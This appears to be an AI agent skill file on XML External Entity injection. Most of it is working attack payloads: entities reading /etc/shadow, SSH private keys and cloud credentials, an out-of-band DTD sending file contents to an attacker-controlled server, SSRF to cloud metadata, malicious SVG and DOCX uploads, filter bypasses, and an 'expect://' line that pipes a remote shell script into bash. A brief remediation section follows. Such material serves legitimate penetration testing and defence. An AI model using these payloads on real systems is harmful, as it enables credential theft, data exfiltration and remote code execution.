---
name: xxe
description: >
  Expert guidance for finding, exploiting, and remediating XML External Entity (XXE) injection
  vulnerabilities. Covers classic XXE, blind XXE via OOB, XXE for SSRF, XXE via file upload,
  SVG/DOCX/XLSX XXE, XInclude attacks, XXE in JSON endpoints, and filter bypasses. Use this skill
  whenever the user mentions XXE, XML external entity, XML injection, DOCTYPE injection, SYSTEM
  entity, file read via XML, blind XXE, OOB XXE, SVG upload XXE, XLSX/DOCX XXE, XInclude, or
  XML-based SSRF. Also trigger for "how do I test for XXE", "exploit XML to read files", "blind
  XXE with DNS", "XXE in file upload", "bypass XXE filters". Always use this skill for any
  XML processing security testing, even quick questions.
---

# XXE Skill — XML External Entity Injection Testing

XXE forces an XML parser to process external entity references — reading local files, performing
SSRF, or exfiltrating data out-of-band.

---

## 1. Attack Surface Map — Start Here

| Scenario | Section |
|----------|---------|
| Classic XXE — response reflects file content | §3.1 |
| Blind XXE — no response reflection (OOB) | §3.2 |
| XXE → SSRF (internal network) | §3.3 |
| XXE via file upload (SVG, DOCX, XLSX, PDF) | §3.4 |
| XInclude attack (no DOCTYPE control) | §3.5 |
| XXE via Content-Type switching | §3.6 |
| Error-based XXE | §3.7 |
| Filter bypass | §4 |
| XXE → RCE (PHP expect://) | §5 |
| Remediation | §6 |

---

## 2. Core Concepts

- **External entity** — `<!ENTITY xxe SYSTEM "file:///etc/passwd">` — parser fetches the URI.
- **Parameter entity** — `%entity;` — used in DTD definitions, powerful for blind XXE.
- **OOB (Out-of-Band)** — Data exfiltrated via DNS/HTTP to attacker server (blind XXE).
- **XInclude** — W3C standard for XML composition; can read files without DOCTYPE.
- **DTD** — Document Type Definition; where entity declarations live.

---

## 3. Attack Techniques

### 3.1 Classic XXE — File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

```xml
<!-- Windows targets -->
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">

<!-- High-value Linux files -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/shadow">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">
<!ENTITY xxe SYSTEM "file:///app/.env">
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///home/ubuntu/.aws/credentials">
```

**Finding the right element:**
- Try injecting entity reference in every XML element
- Look for elements whose value is reflected in the response
- If app validates schema, try injecting in less-validated fields

---

### 3.2 Blind XXE — Out-of-Band Exfiltration

No response reflection — data exfiltrated via DNS/HTTP callbacks.

#### Step 1 — Confirm blind XXE (DNS probe)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR-OAST-DOMAIN/xxe-test">
]>
<root><data>&xxe;</data></root>
```

Check your Burp Collaborator / interactsh for DNS + HTTP hit.

#### Step 2 — Exfiltrate file contents via OOB

Host this DTD on your server at `http://YOUR-SERVER/evil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%wrap;
%send;
```

Inject in the target XML:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">
  %dtd;
]>
<root><data>test</data></root>
```

#### Host the DTD server

```bash
python3 -m http.server 80
# Then watch for:  GET /?data=root:x:0:0:root:/root:/bin/bash...
```

---

### 3.3 XXE → SSRF

```xml
<!-- Probe internal network -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>

<!-- Internal service discovery -->
<!ENTITY xxe SYSTEM "http://10.0.0.1:8080/">
<!ENTITY xxe SYSTEM "http://localhost:6379/">
<!ENTITY xxe SYSTEM "http://internal-admin/">
```

---

### 3.4 XXE via File Upload

#### SVG XXE

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Upload as `.svg` to any image/avatar upload. If the server renders/processes it, contents appear in the rendered image or error.

#### DOCX / XLSX XXE

Office Open XML formats are ZIP archives containing XML files.

```bash
# Unzip a DOCX
cp test.docx /tmp/test.zip && cd /tmp && unzip test.zip

# Inject XXE into word/document.xml
# Add to the top, inside <w:document>:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

# Inject into [Content_Types].xml or xl/workbook.xml for XLSX

# Repack
zip -r malicious.docx . && mv malicious.docx /tmp/
```

#### PDF XXE (via XML-based PDF processors)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<fo:root xmlns:fo="http://www.w3.org/1999/XSL/Format">
  <fo:page-sequence>
    <fo:flow flow-name="xsl-region-body">
      <fo:block>&xxe;</fo:block>
    </fo:flow>
  </fo:page-sequence>
</fo:root>
```

---

### 3.5 XInclude Attack

When you can't control the DOCTYPE (e.g., your input is embedded in server's XML):

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

Inject into any XML field — no DOCTYPE needed. Works if the XML parser has XInclude enabled.

---

### 3.6 XXE via Content-Type Switching

JSON endpoints may accept XML if you switch the Content-Type:

```
# Original request:
POST /api/user/update
Content-Type: application/json
{"name": "test"}

# Switch to XML:
POST /api/user/update
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<user><name>&xxe;</name></user>
```

Also try: `text/xml`, `application/x-www-form-urlencoded` with XML value.

---

### 3.7 Error-Based XXE

When OOB HTTP is blocked but error messages leak data:

```xml
<!-- Host on your server: error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///no-such-file/%file;'>">
%eval;
%error;
```

The parser throws: `File not found: /no-such-file/root:x:0:0:...` — file contents in the error.

---

## 4. Filter Bypass Techniques

```xml
<!-- UTF-16 encoding bypass -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- HTML entities in entity value -->
<!ENTITY xxe SYSTEM "file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd">

<!-- PHP wrapper for base64 encode (avoids binary chars breaking XML) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">

<!-- Alternate file URI forms -->
<!ENTITY xxe SYSTEM "file:////etc/passwd">       (4 slashes)
<!ENTITY xxe SYSTEM "file://localhost/etc/passwd">

<!-- Nested entity bypass -->
<!ENTITY % a "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>">
%a;

<!-- Protocol alternatives for SSRF -->
<!ENTITY xxe SYSTEM "http://127.0.0.1/">
<!ENTITY xxe SYSTEM "https://127.0.0.1/">
<!ENTITY xxe SYSTEM "ftp://127.0.0.1/">
```

---

## 5. XXE → RCE

```xml
<!-- PHP expect:// wrapper (requires PHP expect extension) -->
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "expect://whoami">
<!ENTITY xxe SYSTEM "expect://curl http://YOUR-SERVER/shell.sh|bash">

<!-- Java + Groovy via Jar URI (triggers remote JAR load) -->
<!ENTITY xxe SYSTEM "jar:http://YOUR-SERVER/evil.jar!/">
```

---

## 6. Remediation

1. **Disable external entity processing** in your XML parser (most important):
   - Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
   - Python `lxml`: use `resolve_entities=False` and `no_network=True`
   - PHP: `libxml_disable_entity_loader(true)` (PHP < 8.0)
2. **Disable DOCTYPE declarations** entirely if not needed.
3. **Use a simpler data format** (JSON) for APIs where XML isn't required.
4. **Patch XML libraries** — old versions often have XXE by default.
5. **Input validation** — reject `<!DOCTYPE` and `<!ENTITY` in user input.
6. **Allowlist-based parsing** — only allow the XML elements your app needs.

---

## 7. XXE Testing Checklist

- [ ] Find all XML input points: SOAP, REST with XML CT, file upload, AJAX
- [ ] Try classic file read with `file:///etc/passwd`
- [ ] Try OOB DNS probe (Burp Collaborator / interactsh)
- [ ] Test SVG upload with XXE payload
- [ ] Test DOCX/XLSX upload — unzip and inject
- [ ] Try XInclude if DOCTYPE is stripped
- [ ] Switch Content-Type to XML on JSON endpoints
- [ ] Test PHP wrappers if PHP target: `php://filter/...`
- [ ] Try XXE → SSRF to `169.254.169.254`
- [ ] Test error-based exfil if OOB is blocked
- [ ] Check for `expect://` RCE on PHP targets
